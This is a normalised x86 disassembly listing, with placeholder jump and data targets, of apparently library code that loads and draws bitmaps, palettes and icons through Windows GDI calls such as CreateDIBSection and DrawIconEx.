mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41afb4
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402d24
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41af44
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_4256c8
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_4256e8
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41af44
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_425558
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4287df
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_425990
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026ec
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_428747
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41af44
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_425558
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42871b
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_425c48
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cf34
call sub_425444
jmp r-xdata
xor eax eax
push ebp
push sub_4287ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41af44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428722
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4287e6
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cf34
call sub_425444
jmp r-xdata
sub_428722
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_40270c
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_4287e6
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402d24
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_42887b
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_425c48
mov [ ebp - 0x30 ] eax
sub_428898
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_42824c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4288dc
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_427fdc
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41af44
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402d24
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42824c
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_428374
call sub_425444
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_42894c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_427fdc
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402d24
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_4275f4
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_4289e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42824c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428a10
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_427e98
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_427fdc
mov eax esi
call sub_4280ec
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_427fdc
mov eax esi
call sub_4280ec
mov eax esi
call sub_427f68
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_4275f4
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_4279f8
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_42824c
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_42824c
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_426f90
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428b48
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_427fec
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4279f8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428b9c
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_427fec
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_4279f8
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428c1c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_427fdc
mov eax ebx
call sub_427fec
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_426f90
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428cb3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42824c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_426e88
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_423448
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_428cb8
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403b44
call sub_403b98
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_426e88
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428cf0
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_427fec
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4279f8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428d4c
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402d24
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_427f68
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_426384
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41af7c
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41af7c
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402d24
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_427e2c
mov dl [ r-xdata ]
call sub_425240
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_425558
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_426f44
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41af7c
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41af7c
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41af7c
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41af7c
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41af7c
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41af7c
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_4259c8
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41af7c
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_425cec
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_429004
push ebx
mov ebx eax
mov eax ebx
call sub_427fec
mov edx ebx
mov eax ebx
call sub_427ab8
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
mov ecx edx
cmp edx [ eax + 0x14 ]
jne r-xdata
xor edx edx
mov [ eax + 0x8 ] edx
mov eax ecx
pop ebx
retn
xor edx edx
mov [ eax + 0x14 ] edx
xor edx edx
mov [ eax + 0x2c ] edx
sub_429040
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_427fec
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_426f90
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_4290ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_4275f4
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4290e0
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_429128
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4266c0
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_426dbc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_42917c
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_426dc0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418e88
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_4291ac
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_429484
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_426dbc
mov eax [ esi + 0x28 ]
call sub_426dc0
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_418eb4
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_42920c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_425240
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_429264
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_4292a0
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41ad38
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41af44
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_425f98
jmp r-xdata
jmp r-xdata
call sub_425450
sub_429318
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4293a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_429264
cmp eax [ rw-data ]
jne r-xdata
call sub_425450
mov eax esi
call sub_429264
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4264c4
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402d24
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41af7c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4293cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42945a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41ad18
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41af44
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41af44
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_429484
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_425450
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42945f
mov eax [ ebp - 0x4 ]
call sub_403368
call sub_403b44
call sub_403b98
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429484
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4294c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_426dbc
mov eax [ ebx + 0x28 ]
call sub_426dc0
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429544
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_429318
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41af7c
pop esi
pop ebx
retn
sub_429594
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_425a98
mov [ rw-data ] eax
pop ebx
retn
sub_4295cc
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
